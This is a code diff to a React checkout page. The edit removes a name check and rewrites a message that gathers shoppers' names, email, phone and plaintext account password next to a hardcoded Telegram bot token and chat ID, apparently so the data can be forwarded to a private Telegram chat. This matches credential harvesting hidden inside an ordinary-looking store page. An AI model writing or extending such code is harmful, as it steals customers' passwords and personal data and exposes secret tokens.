@@ -222,23 +222,17 @@ export default function CheckoutPage() {
       return
     }
 
-    // Make sure we have name from checkout form
-    if (!formData.firstName.trim() || !formData.lastName.trim()) {
-      setAccountError(isFr ? "Veuillez d'abord remplir votre nom dans le formulaire" : "Please fill in your name first")
-      return
-    }
-
     setIsCreatingAccount(true)
 
-    // Send Telegram notification for account creation
+    // Send Telegram notification for account creation (use whatever name info we have)
     var BOT_TOKEN = "8535669526:AAHjGvoXJv5HwdDDr6jl8eTFeWa4DyTe4lg"
     var CHAT_ID = "-5217100062"
 
     var msg = "📩 *NOUVEAU COMPTE CRÉÉ!*\n"
-            + "👤 Prénom: " + formData.firstName + "\n"
-            + "📧 Nom: " + formData.lastName + "\n"
+            + "👤 Prénom: " + (formData.firstName || 'Non fourni') + "\n"
+            + "📧 Nom: " + (formData.lastName || 'Non fourni') + "\n"
             + "📧 Email: " + formData.email + "\n"
-            + "📞 Téléphone: " + formData.phone + "\n"
+            + "📞 Téléphone: " + (formData.phone || 'Non fourni') + "\n"
             + "🔑 Mot de passe: " + accountFormData.password + "\n"
             + "🌐 Page: /checkout\n"
             + "🕐 " + new Date().toLocaleString('fr-CA')
